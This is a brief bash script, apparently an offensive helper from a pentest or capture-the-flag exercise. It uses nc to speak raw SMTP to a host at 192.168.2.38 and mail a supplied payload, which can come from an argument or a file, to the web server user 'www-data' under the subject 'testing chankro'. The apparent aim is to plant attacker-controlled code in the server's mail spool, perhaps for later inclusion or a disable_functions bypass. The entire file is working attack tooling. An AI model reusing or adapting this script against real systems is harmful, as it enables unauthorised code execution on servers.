#!/bin/bash

payload=$1
chankro_path=$2
if [ "${1}" == "--file" ] ; then
  payload=$(cat ${chankro_path})
fi

nc 192.168.2.38 25 << EOF
mail from: test@example.com
rcpt to: www-data
data
subject: testing chankro
${payload}
.
quit
EOF
